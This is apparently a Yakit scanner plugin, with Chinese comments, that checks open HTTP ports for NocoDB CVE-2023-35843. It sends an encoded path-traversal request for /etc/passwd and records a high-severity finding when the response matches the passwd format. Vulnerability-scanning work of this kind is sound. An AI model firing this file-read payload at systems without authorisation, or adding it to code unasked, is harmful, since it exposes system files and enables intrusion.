            '# port scan plugin\nyakit.AutoInitYakit()\n\n// 准备发送的报文模版 \n\n\n\nPacket = `GET {{params(payload)}} HTTP/1.1\nHost: {{params(target)}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n\n`\n\n\n//漏洞检测规则函数 \nrules = []\naddRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {\n    rules = append(rules, {\n        "packet": packet,\n        "payload": payload,\n        "check": check,\n        "type": riskType,\n        "typeVerbose": riskTypeVerbose,\n        "severity": severity,\n        "reference":reference,\n    })\n}\n\n\n//填充对应的漏洞检测规则\naddRule(Packet,`/download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd`,func(rsp,header,body){\n    if rsp.StatusCode == 200 && str.MatchAllOfRegexp(body, "root:[x*]:0:0:") {\n        return true\n    }\n    return false\n},"file-read","NocoDB-CVE-2023-35843","high","https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-35843")\n\n\n//漏洞检测handle \nhandleRule = func(swg, isTls, addr, rule) {\n    swg.Add()\n    go func{\n        defer swg.Done()\n\n        defer func{\n            recover()\n        }\n\n        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))\n        if err != nil {\n            yakit.Error("poc.HTTP error: %v", err)\n            return\n        }\n        header, body = poc.Split(resp)\n        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)\n        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)\n        url = urlIns.String()\n        if rule.check(rspIns, header, body) {\n            yakit.Info("FOUND INFO for %v", rule.typeVerbose)\n            risk.NewRisk(\n                url, risk.severity(rule.severity), \n                risk.title(sprintf("FOUND %v", rule.typeVerbose)),\n                risk.titleVerbose(sprintf("reference %v", rule.reference)),\n                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),\n                risk.payload(rule.payload), risk.details({\n                    "request": req,\n                    "response": resp,\n                    "url": url,\n                }),\n            )\n            return\n        }\n        return\n    }\n}\n\n\n\nhandle = func(result) {\n    if !result.IsOpen() {\n        return\n    }\n\n    //判断是否是http\n    if len(result.Fingerprint.HttpFlows) <= 0 {\n        return\n    }\n    addr = str.HostPort(result.Target, result.Port)\n    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))\n\n    // 漏洞检测\n    swg = sync.NewSizedWaitGroup(10)\n    for _, rule = range rules {\n        handleRule(swg, isTls, addr, rule)\n    }\n    swg.Wait()\n}\n',
